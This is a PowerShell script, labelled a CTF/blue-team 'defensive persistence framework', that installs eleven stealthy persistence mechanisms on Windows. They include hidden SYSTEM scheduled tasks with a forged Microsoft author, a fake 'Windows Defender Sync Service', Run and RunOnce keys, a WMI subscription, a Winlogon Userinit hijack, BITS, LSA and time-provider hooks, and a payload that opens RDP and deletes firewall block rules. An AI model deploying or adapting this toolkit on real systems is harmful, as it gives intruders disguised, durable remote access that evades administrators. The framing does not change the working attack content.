#Requires -RunAsAdministrator

[CmdletBinding(SupportsShouldProcess)]
param(
    [string]$PayloadPath     = "",
    [string]$ServiceName     = "WinDefSync",
    [string]$DisplayName     = "Windows Defender Sync Service",
    [switch]$Install,
    [switch]$Remove,
    [switch]$Harden,
    [int[]]$Mechanisms       = @(1,2,3,4,5,6,7,8,9,10,11)
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Continue"

$Script:Config = @{
    Marker          = "WindowsUpdateAssistant"
    DropDir         = "$env:ProgramData\Microsoft\Windows\Maintenance"
    TaskFolder      = "\Microsoft\Windows\Maintenance\"
    TaskNames       = @(
        "\Microsoft\Windows\Maintenance\WinSAT",
        "\Microsoft\Windows\Maintenance\SystemSoundsService",
        "\Microsoft\Windows\Maintenance\PerfTuning"
    )
    WmiFilterName   = "SCMHealthFilter"
    WmiConsumerName = "SCMHealthConsumer"
    WmiBindingName  = "SCMHealthBinding"
    RunKey          = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    RunOnceKey      = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
    WinlogonKey     = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    AppInitKey      = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"
    LSAKey          = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
    TimeProv        = "HKLM:\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders"
}

$EmbeddedPayloadScript = @'
$logFile = "$env:ProgramData\Microsoft\Windows\Maintenance\svc.log"
function Write-Log($msg) {
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Add-Content -Path $logFile -Value "[$ts] $msg" -ErrorAction SilentlyContinue
}

$servicePortMap = @{
    "TermService"  = @{ TCP = @(3389);        UDP = @(3389) }
    "WinRM"        = @{ TCP = @(5985, 5986);  UDP = @()     }
    "MSSQLSERVER"  = @{ TCP = @(1433, 1434);  UDP = @(1434) }
    "EventLog"     = @{ TCP = @();            UDP = @()     }
}

function Remove-BlockingRules {
    param([string]$ServiceName, [int[]]$TcpPorts, [int[]]$UdpPorts)
    $blockRules = Get-NetFirewallRule -Direction Inbound -Action Block -ErrorAction SilentlyContinue
    if (-not $blockRules) { return }
    foreach ($rule in $blockRules) {
        $removed = $false
        $portFilter = $rule | Get-NetFirewallPortFilter -ErrorAction SilentlyContinue
        if (-not $portFilter) { continue }
        if ($TcpPorts.Count -gt 0 -and ($portFilter.Protocol -eq 'TCP' -or $portFilter.Protocol -eq 'Any')) {
            $blockedPorts = @($portFilter.LocalPort) | Where-Object { $_ -ne 'Any' }
            foreach ($port in $TcpPorts) {
                if ($blockedPorts -contains [string]$port -or $portFilter.LocalPort -eq 'Any') {
                    try {
                        Remove-NetFirewallRule -Name $rule.Name -ErrorAction Stop
                        Write-Log "Removed TCP block rule '$($rule.DisplayName)' (port $port) for $ServiceName"
                        $removed = $true
                        break
                    } catch {
                        Write-Log "Failed to remove rule '$($rule.DisplayName)': $_"
                    }
                }
            }
        }
        if ($removed) { continue }
        if ($UdpPorts.Count -gt 0 -and ($portFilter.Protocol -eq 'UDP' -or $portFilter.Protocol -eq 'Any')) {
            $blockedPorts = @($portFilter.LocalPort) | Where-Object { $_ -ne 'Any' }
            foreach ($port in $UdpPorts) {
                if ($blockedPorts -contains [string]$port -or $portFilter.LocalPort -eq 'Any') {
                    try {
                        Remove-NetFirewallRule -Name $rule.Name -ErrorAction Stop
                        Write-Log "Removed UDP block rule '$($rule.DisplayName)' (port $port) for $ServiceName"
                        break
                    } catch {
                        Write-Log "Failed to remove rule '$($rule.DisplayName)': $_"
                    }
                }
            }
        }
    }
}

function Ensure-AllowRule {
    param([string]$ServiceName, [int[]]$TcpPorts, [int[]]$UdpPorts)
    foreach ($port in $TcpPorts) {
        $existing = Get-NetFirewallRule -Direction Inbound -Action Allow -ErrorAction SilentlyContinue |
            Where-Object {
                $pf = $_ | Get-NetFirewallPortFilter -ErrorAction SilentlyContinue
                $pf -and ($pf.Protocol -eq 'TCP' -or $pf.Protocol -eq 'Any') -and
                ($pf.LocalPort -eq 'Any' -or @($pf.LocalPort) -contains [string]$port)
            }
        if (-not $existing) {
            try {
                New-NetFirewallRule `
                    -DisplayName  "SvcGuard Allow $ServiceName TCP $port" `
                    -Direction    Inbound `
                    -Action       Allow `
                    -Protocol     TCP `
                    -LocalPort    $port `
                    -ErrorAction  Stop | Out-Null
                Write-Log "Created Allow rule: $ServiceName TCP $port"
            } catch {
                Write-Log "Failed to create Allow rule for $ServiceName TCP $port : $_"
            }
        }
    }
    foreach ($port in $UdpPorts) {
        $existing = Get-NetFirewallRule -Direction Inbound -Action Allow -ErrorAction SilentlyContinue |
            Where-Object {
                $pf = $_ | Get-NetFirewallPortFilter -ErrorAction SilentlyContinue
                $pf -and ($pf.Protocol -eq 'UDP' -or $pf.Protocol -eq 'Any') -and
                ($pf.LocalPort -eq 'Any' -or @($pf.LocalPort) -contains [string]$port)
            }
        if (-not $existing) {
            try {
                New-NetFirewallRule `
                    -DisplayName  "SvcGuard Allow $ServiceName UDP $port" `
                    -Direction    Inbound `
                    -Action       Allow `
                    -Protocol     UDP `
                    -LocalPort    $port `
                    -ErrorAction  Stop | Out-Null
                Write-Log "Created Allow rule: $ServiceName UDP $port"
            } catch {
                Write-Log "Failed to create Allow rule for $ServiceName UDP $port : $_"
            }
        }
    }
}

try {
    Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" `
        -Name "fDenyTSConnections" -Value 0 -Type DWord -Force
    Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" `
        -Name "UserAuthentication" -Value 1 -Type DWord -Force
    Write-Log "RDP registry ensured."
} catch { Write-Log "RDP ensure error: $_" }

foreach ($svcName in $servicePortMap.Keys) {
    $ports = $servicePortMap[$svcName]
    $tcp   = $ports.TCP
    $udp   = $ports.UDP
    if ($tcp.Count -eq 0 -and $udp.Count -eq 0) { continue }
    try {
        Remove-BlockingRules -ServiceName $svcName -TcpPorts $tcp -UdpPorts $udp
        Ensure-AllowRule     -ServiceName $svcName -TcpPorts $tcp -UdpPorts $udp
    } catch {
        Write-Log "Firewall guard error for $svcName : $_"
    }
}

$criticalServices = @(
    "TermService",
    "WinRM",
    "MSSQLSERVER",
    "EventLog"
)

foreach ($svcName in $criticalServices) {
    $svc = Get-Service -Name $svcName -ErrorAction SilentlyContinue
    if ($svc -and $svc.Status -ne 'Running') {
        try {
            Start-Service -Name $svcName -ErrorAction Stop
            Write-Log "Restarted service: $svcName"
        } catch {
            Write-Log "Failed to restart $svcName : $_"
        }
    }
}

Write-Log "Keepalive check complete."
'@

function Write-Status($msg, $color = "Cyan") { Write-Host "  [+] $msg" -ForegroundColor $color }
function Write-Warn($msg)  { Write-Host "  [!] $msg" -ForegroundColor Yellow }
function Write-Err($msg)   { Write-Host "  [-] $msg" -ForegroundColor Red }

function Ensure-DropDir {
    if (-not (Test-Path $Script:Config.DropDir)) {
        New-Item -ItemType Directory -Path $Script:Config.DropDir -Force | Out-Null
    }
}

function Set-HardenedPermissions {
    param(
        [string]$Path,
        [switch]$IsFile
    )
    try {
        $inherit = [System.Security.AccessControl.InheritanceFlags]"ContainerInherit,ObjectInherit"
        $none    = [System.Security.AccessControl.PropagationFlags]::None
        $allow   = [System.Security.AccessControl.AccessControlType]::Allow

        if ($IsFile) {
            $acl = New-Object System.Security.AccessControl.FileSecurity
        } else {
            $acl = New-Object System.Security.AccessControl.DirectorySecurity
        }

        $acl.SetAccessRuleProtection($true, $false)

        if ($IsFile) {
            $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(
                "NT AUTHORITY\SYSTEM", "FullControl", $allow)))
            $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(
                "BUILTIN\Administrators", "FullControl", $allow)))
        } else {
            $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(
                "NT AUTHORITY\SYSTEM", "FullControl", $inherit, $none, $allow)))
            $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(
                "BUILTIN\Administrators", "FullControl", $inherit, $none, $allow)))
        }

        Set-Acl -Path $Path -AclObject $acl -ErrorAction Stop
        Write-Status "Permissions hardened (SYSTEM+Admins only): $Path"
    } catch {
        Write-Err "Failed to harden permissions on $Path : $_"
    }
}

function Get-PayloadPath { return "$($Script:Config.DropDir)\maint.ps1" }

function Get-PSLauncher {
    $p = Get-PayloadPath
    return "powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$p`""
}

function Stage-Payload {
    Ensure-DropDir
    Set-HardenedPermissions -Path $Script:Config.DropDir
    $dest = Get-PayloadPath
    if ($Script:PayloadPath -ne "" -and (Test-Path $PayloadPath)) {
        Copy-Item $PayloadPath $dest -Force
        Write-Status "Staged custom payload to $dest"
    } else {
        $EmbeddedPayloadScript | Out-File -FilePath $dest -Encoding UTF8 -Force
        Write-Status "Staged embedded payload to $dest"
    }
    Set-HardenedPermissions -Path $dest -IsFile
}

function Install-SchedTasks {
    $action = New-ScheduledTaskAction -Execute "powershell.exe" `
        -Argument "-NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$(Get-PayloadPath)`""
    $settings = New-ScheduledTaskSettingsSet `
        -Hidden `
        -MultipleInstances IgnoreNew `
        -ExecutionTimeLimit (New-TimeSpan -Minutes 5) `
        -RestartCount 3 `
        -RestartInterval (New-TimeSpan -Minutes 1) `
        -StartWhenAvailable
    $principal = New-ScheduledTaskPrincipal `
        -UserId "SYSTEM" -RunLevel Highest -LogonType ServiceAccount
    $triggerBoot       = New-ScheduledTaskTrigger -AtStartup
    $triggerBoot.Delay = "PT30S"
    $triggerLogon      = New-ScheduledTaskTrigger -AtLogOn
    $triggerRepeat     = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 1) -Once -At (Get-Date)
    $names    = $Script:Config.TaskNames
    $triggers = @($triggerBoot, $triggerLogon, $triggerRepeat)
    for ($i = 0; $i -lt $names.Count; $i++) {
        try {
            $task = Register-ScheduledTask `
                -TaskName  $names[$i] -Action $action -Trigger $triggers[$i] `
                -Principal $principal -Settings $settings -Force
            $taskXml = Export-ScheduledTask -TaskName $names[$i]
            $taskXml = $taskXml -replace '<Description>.*?</Description>', ''
            $taskXml = $taskXml -replace '(<Author>).*?(</Author>)', '${1}Microsoft Corporation${2}'
            $taskXml = $taskXml -replace '(<URI>).*?(</URI>)', "${1}$($names[$i])${2}"
            Unregister-ScheduledTask -TaskName $names[$i] -Confirm:$false -ErrorAction SilentlyContinue
            Register-ScheduledTask -Xml $taskXml -TaskName $names[$i] -Force | Out-Null
            Write-Status "Scheduled Task installed: $($names[$i])"
        } catch { Write-Err "SchedTask $($names[$i]) failed: $_" }
    }
}
function Remove-SchedTasks {
    foreach ($name in $Script:Config.TaskNames) {
        try {
            Unregister-ScheduledTask -TaskName $name -Confirm:$false -ErrorAction Stop
            Write-Status "Removed scheduled task: $name"
        } catch { Write-Warn "Task $name not found or already removed." }
    }
}

function Install-RegRunKey {
    try {
        Set-ItemProperty -Path $Script:Config.RunKey -Name "MicrosoftUpdateAssistant" `
            -Value (Get-PSLauncher) -Type String -Force
        Write-Status "Registry Run key set (HKLM)"
    } catch { Write-Err "RegRunKey failed: $_" }
}
function Remove-RegRunKey {
    try {
        Remove-ItemProperty -Path $Script:Config.RunKey -Name "MicrosoftUpdateAssistant" -ErrorAction Stop
        Write-Status "Removed Registry Run key"
    } catch { Write-Warn "RegRunKey not present." }
}

function Install-RegRunOnce {
    $reRegCmd = "powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command " +
                "\"& { & '$(Get-PayloadPath)'; " +
                "Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce' " +
                "-Name 'MicrosoftUpdateAssistant_RO' -Value (Get-Content '$($Script:Config.DropDir)\\cfg.dat') -Type String -Force }\""
    $cfgPath = "$($Script:Config.DropDir)\cfg.dat"
    $reRegCmd | Out-File $cfgPath -Encoding ASCII -Force
    Set-HardenedPermissions -Path $cfgPath -IsFile
    try {
        Set-ItemProperty -Path $Script:Config.RunOnceKey -Name "MicrosoftUpdateAssistant_RO" `
            -Value $reRegCmd -Type String -Force
        Write-Status "Registry RunOnce key set (self-replicating)"
    } catch { Write-Err "RegRunOnce failed: $_" }
}
function Remove-RegRunOnce {
    try {
        Remove-ItemProperty -Path $Script:Config.RunOnceKey -Name "MicrosoftUpdateAssistant_RO" -ErrorAction Stop
        Write-Status "Removed Registry RunOnce key"
    } catch { Write-Warn "RegRunOnce not present." }
}

function Install-WinService {
    $binPath = "powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$(Get-PayloadPath)`""
    try {
        $null = sc.exe create $Script:Config.ServiceName binPath= $binPath start= auto DisplayName= $Script:Config.DisplayName
        $null = sc.exe description $Script:Config.ServiceName $Script:Config.Marker
        $null = sc.exe failure $Script:Config.ServiceName reset= 86400 actions= restart/1000/restart/1000/restart/1000
        Start-Service -Name $Script:Config.ServiceName -ErrorAction SilentlyContinue
        Write-Status "Windows Service installed: $($Script:Config.ServiceName)"
    } catch { Write-Err "WinService install failed: $_" }
}
function Remove-WinService {
    try {
        Stop-Service -Name $Script:Config.ServiceName -Force -ErrorAction SilentlyContinue
        $null = sc.exe delete $Script:Config.ServiceName
        Write-Status "Removed Windows Service: $($Script:Config.ServiceName)"
    } catch { Write-Warn "Service not present or could not be removed." }
}

function Install-WMISubscription {
    try {
        Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding `
            -Filter "Filter='__EventFilter.Name=""$($Script:Config.WmiFilterName)""'" `
            -ErrorAction SilentlyContinue | Remove-WMIObject -ErrorAction SilentlyContinue
        Get-WMIObject -Namespace root\subscription -Class CommandLineEventConsumer `
            -Filter "Name='$($Script:Config.WmiConsumerName)'" `
            -ErrorAction SilentlyContinue | Remove-WMIObject -ErrorAction SilentlyContinue
        Get-WMIObject -Namespace root\subscription -Class __EventFilter `
            -Filter "Name='$($Script:Config.WmiFilterName)'" `
            -ErrorAction SilentlyContinue | Remove-WMIObject -ErrorAction SilentlyContinue
        $filterArgs = @{
            Name           = $Script:Config.WmiFilterName
            EventNamespace = "root\cimv2"
            QueryLanguage  = "WQL"
            Query          = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE " +
                             "TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' " +
                             "AND TargetInstance.SystemUpTime >= 60 AND TargetInstance.SystemUpTime < 120"
        }
        $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterArgs
        $consumerArgs = @{
            Name                = $Script:Config.WmiConsumerName
            CommandLineTemplate = (Get-PSLauncher)
        }
        $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $consumerArgs
        $bindingArgs = @{ Filter = $filter; Consumer = $consumer }
        Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $bindingArgs | Out-Null
        Write-Status "WMI Subscription installed"
    } catch { Write-Err "WMI subscription failed: $_" }
}
function Remove-WMISubscription {
    try {
        Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding `
            -Filter "Filter='__EventFilter.Name=""$($Script:Config.WmiFilterName)""'" `
            -ErrorAction SilentlyContinue | Remove-WMIObject
        Get-WMIObject -Namespace root\subscription -Class CommandLineEventConsumer `
            -Filter "Name='$($Script:Config.WmiConsumerName)'" `
            -ErrorAction SilentlyContinue | Remove-WMIObject
        Get-WMIObject -Namespace root\subscription -Class __EventFilter `
            -Filter "Name='$($Script:Config.WmiFilterName)'" `
            -ErrorAction SilentlyContinue | Remove-WMIObject
        Write-Status "Removed WMI subscription"
    } catch { Write-Warn "WMI subscription cleanup issue: $_" }
}

function Install-StartupFolder {
    $startupDir  = [Environment]::GetFolderPath("CommonStartup")
    $lnkTarget   = "$($Script:Config.DropDir)\maint.bat"
    $startupFile = "$startupDir\WindowsMaintenance.bat"
    "@echo off`npowershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$(Get-PayloadPath)`"" |
        Out-File -FilePath $lnkTarget -Encoding ASCII -Force
    Set-HardenedPermissions -Path $lnkTarget -IsFile
    Copy-Item $lnkTarget $startupFile -Force
    Set-HardenedPermissions -Path $startupFile -IsFile
    Write-Status "Startup folder entry installed: $startupFile"
}
function Remove-StartupFolder {
    $startupDir = [Environment]::GetFolderPath("CommonStartup")
    $f = "$startupDir\WindowsMaintenance.bat"
    if (Test-Path $f) { Remove-Item $f -Force; Write-Status "Removed startup folder entry" }
    else { Write-Warn "Startup folder entry not found." }
}

function Install-WinlogonUserinit {
    try {
        $key     = $Script:Config.WinlogonKey
        $current = (Get-ItemProperty -Path $key -Name Userinit).Userinit
        $append  = (Get-PSLauncher) + ","
        if ($current -notlike "*$($Script:Config.Marker)*") {
            if (-not $current.TrimEnd().EndsWith(",")) { $current += "," }
            Set-ItemProperty -Path $key -Name Userinit -Value ($current + $append) -Force
            Write-Status "Winlogon Userinit modified"
        } else { Write-Warn "Winlogon Userinit already contains our entry." }
    } catch { Write-Err "Winlogon Userinit failed: $_" }
}
function Remove-WinlogonUserinit {
    try {
        $key      = $Script:Config.WinlogonKey
        $current  = (Get-ItemProperty -Path $key -Name Userinit).Userinit
        $launcher = (Get-PSLauncher) + ","
        $cleaned  = $current.Replace($launcher, "")
        Set-ItemProperty -Path $key -Name Userinit -Value $cleaned -Force
        Write-Status "Winlogon Userinit restored"
    } catch { Write-Warn "Winlogon Userinit restore issue: $_" }
}

function Install-BITSJob {
    try {
        Get-BitsTransfer -Name $Script:Config.Marker -AllUsers -ErrorAction SilentlyContinue | Remove-BitsTransfer -ErrorAction SilentlyContinue
        $dummySrc  = "$($Script:Config.DropDir)\bits_trigger.txt"
        $dummyDest = "$($Script:Config.DropDir)\bits_trigger_out.txt"
        "trigger" | Out-File $dummySrc -Force
        Set-HardenedPermissions -Path $dummySrc -IsFile
        Import-Module BitsTransfer -ErrorAction SilentlyContinue
        $job = Start-BitsTransfer -Source "file://$dummySrc" -Destination $dummyDest `
            -DisplayName $Script:Config.Marker -Description $Script:Config.Marker `
            -Asynchronous -NotifyFlags 3 `
            -NotifyCmdLine "powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$(Get-PayloadPath)`""
        Write-Status "BITS Job created: $($job.JobId)"
    } catch { Write-Err "BITS Job failed: $_" }
}
function Remove-BITSJob {
    try {
        Get-BitsTransfer -Name $Script:Config.Marker -AllUsers -ErrorAction SilentlyContinue | Remove-BitsTransfer
        Write-Status "Removed BITS job"
    } catch { Write-Warn "BITS job not found." }
}

function Install-LSAPackage {
    Write-Warn "LSA: compile wbemntfy.dll (see DLL_BUILD_GUIDE.md), copy to System32, then reboot."
    try {
        $key      = $Script:Config.LSAKey
        $propName = "Notification Packages"
        $current  = (Get-ItemProperty -Path $key -Name $propName).$propName
        if ($current -notcontains "wbemntfy") {
            $new = $current + @("wbemntfy")
            Set-ItemProperty -Path $key -Name $propName -Value $new -Type MultiString -Force
            Write-Status "LSA Notification Package entry added"
        } else { Write-Warn "LSA package entry already present." }
        $lsaDll = "$env:WINDIR\System32\wbemntfy.dll"
        if (Test-Path $lsaDll) {
            Set-HardenedPermissions -Path $lsaDll -IsFile
        } else {
            Write-Warn "wbemntfy.dll not yet in System32 — harden it after you copy it there"
        }
    } catch { Write-Err "LSA Notification Package failed: $_" }
}
function Remove-LSAPackage {
    try {
        $key      = $Script:Config.LSAKey
        $propName = "Notification Packages"
        $current  = (Get-ItemProperty -Path $key -Name $propName).$propName
        $new      = $current | Where-Object { $_ -ne "wbemntfy" }
        Set-ItemProperty -Path $key -Name $propName -Value $new -Type MultiString -Force
        Write-Status "Removed LSA package entry"
    } catch { Write-Warn "LSA package entry not found." }
}

function Install-TimeProvider {
    Write-Warn "TimeProv: compile w32tmaux.dll (see DLL_BUILD_GUIDE.md), copy to Maintenance folder, restart W32Time."
    $keyPath = "$($Script:Config.TimeProv)\NtpClientAux"
    $dllPath = "$($Script:Config.DropDir)\w32tmaux.dll"
    try {
        if (-not (Test-Path $keyPath)) { New-Item -Path $keyPath -Force | Out-Null }
        Set-ItemProperty -Path $keyPath -Name DllName       -Value $dllPath -Type String -Force
        Set-ItemProperty -Path $keyPath -Name Enabled       -Value 1 -Type DWord -Force
        Set-ItemProperty -Path $keyPath -Name InputProvider -Value 0 -Type DWord -Force
        Write-Status "Time Provider registry written"
        if (Test-Path $dllPath) {
            Set-HardenedPermissions -Path $dllPath -IsFile
        } else {
            Write-Warn "w32tmaux.dll not yet present — harden it after you copy it to $($Script:Config.DropDir)"
        }
    } catch { Write-Err "Time Provider failed: $_" }
}
function Remove-TimeProvider {
    $keyPath = "$($Script:Config.TimeProv)\NtpClientAux"
    if (Test-Path $keyPath) {
        Remove-Item $keyPath -Recurse -Force
        Write-Status "Removed Time Provider registry entry"
    }
}

function Install-ServiceRecovery {
    $targets = @("TermService", "WinRM", "Schedule")
    foreach ($svc in $targets) {
        try {
            $null = sc.exe failure $svc reset= 86400 actions= restart/1000/restart/1000/restart/1000
            $null = sc.exe failureflag $svc 1
            Write-Status "Failure recovery set: $svc"
        } catch { Write-Err "ServiceRecovery for $svc failed: $_" }
    }
}
function Remove-ServiceRecovery {
    $targets = @("TermService", "WinRM", "Schedule")
    foreach ($svc in $targets) {
        try {
            $null = sc.exe failure $svc reset= 0 actions= ""
            $null = sc.exe failureflag $svc 0
            Write-Status "Cleared failure recovery for: $svc"
        } catch { Write-Warn "Could not clear recovery for $svc" }
    }
}

function Invoke-HardenAll {
    Write-Host "`n[*] Hardening permissions on all artifact paths..." -ForegroundColor White

    $dropDir = $Script:Config.DropDir
    if (Test-Path $dropDir) {
        Set-HardenedPermissions -Path $dropDir
    }

    $files = @(
        "$dropDir\maint.ps1",
        "$dropDir\maint.bat",
        "$dropDir\cfg.dat",
        "$dropDir\bits_trigger.txt",
        "$dropDir\w32tmaux.dll"
    )
    foreach ($f in $files) {
        if (Test-Path $f) { Set-HardenedPermissions -Path $f -IsFile }
    }

    $startupFile = "$([Environment]::GetFolderPath('CommonStartup'))\WindowsMaintenance.bat"
    if (Test-Path $startupFile) { Set-HardenedPermissions -Path $startupFile -IsFile }

    $lsaDll = "$env:WINDIR\System32\wbemntfy.dll"
    if (Test-Path $lsaDll) {
        Set-HardenedPermissions -Path $lsaDll -IsFile
    } else {
        Write-Warn "wbemntfy.dll not found in System32 — deploy it then re-run -Harden"
    }

    Write-Host "`n[+] Hardening complete. Verify with:" -ForegroundColor Green
    Write-Host "    icacls `"$dropDir`"" -ForegroundColor Green
    Write-Host "    icacls `"$startupFile`"" -ForegroundColor Green
    Write-Host "    icacls `"$lsaDll`"" -ForegroundColor Green
}

function Enable-RDPNow {
    Write-Host "`n[*] Enabling RDP immediately..." -ForegroundColor Magenta
    try {
        Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" `
            -Name fDenyTSConnections -Value 0 -Type DWord -Force
        Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" `
            -Name UserAuthentication -Value 1 -Type DWord -Force
        Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue
        Set-Service -Name TermService -StartupType Automatic
        Start-Service -Name TermService
        Write-Status "RDP enabled and TermService started."
    } catch { Write-Err "Could not fully enable RDP: $_" }
}

$MechanismMap = @{
    1  = @{ Install = { Install-SchedTasks };      Remove = { Remove-SchedTasks };      Name = "Scheduled Tasks" }
    2  = @{ Install = { Install-RegRunKey };       Remove = { Remove-RegRunKey };       Name = "Registry Run Key" }
    3  = @{ Install = { Install-RegRunOnce };      Remove = { Remove-RegRunOnce };      Name = "Registry RunOnce" }
    4  = @{ Install = { Install-WinService };      Remove = { Remove-WinService };      Name = "Windows Service" }
    5  = @{ Install = { Install-WMISubscription }; Remove = { Remove-WMISubscription }; Name = "WMI Subscription" }
    6  = @{ Install = { Install-StartupFolder };   Remove = { Remove-StartupFolder };   Name = "Startup Folder" }
    7  = @{ Install = { Install-WinlogonUserinit };Remove = { Remove-WinlogonUserinit };Name = "Winlogon Userinit" }
    8  = @{ Install = { Install-BITSJob };         Remove = { Remove-BITSJob };         Name = "BITS Job" }
    9  = @{ Install = { Install-LSAPackage };      Remove = { Remove-LSAPackage };      Name = "LSA Package" }
    10 = @{ Install = { Install-TimeProvider };    Remove = { Remove-TimeProvider };    Name = "Time Provider" }
    11 = @{ Install = { Install-ServiceRecovery }; Remove = { Remove-ServiceRecovery }; Name = "Service Recovery" }
}

function Show-Banner {
    Write-Host @"

╔══════════════════════════════════════════════════════════════╗
║     Defensive Persistence Framework — CTF / Blue Team        ║
║     Installs redundant mechanisms to retain service access   ║
╚══════════════════════════════════════════════════════════════╝
"@ -ForegroundColor Cyan
}

function Show-Summary {
    Write-Host "`n[*] Mechanisms available:" -ForegroundColor White
    foreach ($k in ($MechanismMap.Keys | Sort-Object)) {
        $marker = if ($Mechanisms -contains $k) { "✓" } else { "○" }
        Write-Host "    [$marker] $k. $($MechanismMap[$k].Name)" -ForegroundColor $(if ($Mechanisms -contains $k) { "Green" } else { "DarkGray" })
    }
    Write-Host ""
}

if (-not $Install -and -not $Remove -and -not $Harden) {
    Show-Banner
    Write-Host "Usage:" -ForegroundColor Yellow
    Write-Host "  Install all:  .\Invoke-PersistenceFramework.ps1 -Install"
    Write-Host "  Install some: .\Invoke-PersistenceFramework.ps1 -Install -Mechanisms 1,2,5"
    Write-Host "  Remove all:   .\Invoke-PersistenceFramework.ps1 -Remove"
    Write-Host "  Harden only:  .\Invoke-PersistenceFramework.ps1 -Harden"
    Write-Host "  Custom path:  .\Invoke-PersistenceFramework.ps1 -Install -PayloadPath C:\myagent.exe"
    Show-Summary
    exit 0
}

Show-Banner

if ($Harden) {
    Invoke-HardenAll
}

if ($Install) {
    Write-Host "[*] Installing persistence mechanisms..." -ForegroundColor White
    Stage-Payload
    Enable-RDPNow
    foreach ($num in ($Mechanisms | Sort-Object)) {
        if ($MechanismMap.ContainsKey($num)) {
            Write-Host "`n[*] Mechanism $num — $($MechanismMap[$num].Name)" -ForegroundColor White
            & $MechanismMap[$num].Install
        }
    }
    Invoke-HardenAll
    Write-Host "`n[+] All selected mechanisms installed." -ForegroundColor Green
    Write-Host "    Payload: $(Get-PayloadPath)" -ForegroundColor Green
    Write-Host "    Logs:    $($Script:Config.DropDir)\svc.log`n" -ForegroundColor Green
}

if ($Remove) {
    Write-Host "[*] Removing persistence mechanisms..." -ForegroundColor White
    foreach ($num in ($Mechanisms | Sort-Object)) {
        if ($MechanismMap.ContainsKey($num)) {
            Write-Host "`n[*] Removing Mechanism $num — $($MechanismMap[$num].Name)" -ForegroundColor White
            & $MechanismMap[$num].Remove
        }
    }
    if (Test-Path $Script:Config.DropDir) {
        Remove-Item $Script:Config.DropDir -Recurse -Force -ErrorAction SilentlyContinue
        Write-Status "Removed drop directory: $($Script:Config.DropDir)"
    }
    Write-Host "`n[+] Cleanup complete.`n" -ForegroundColor Green
}
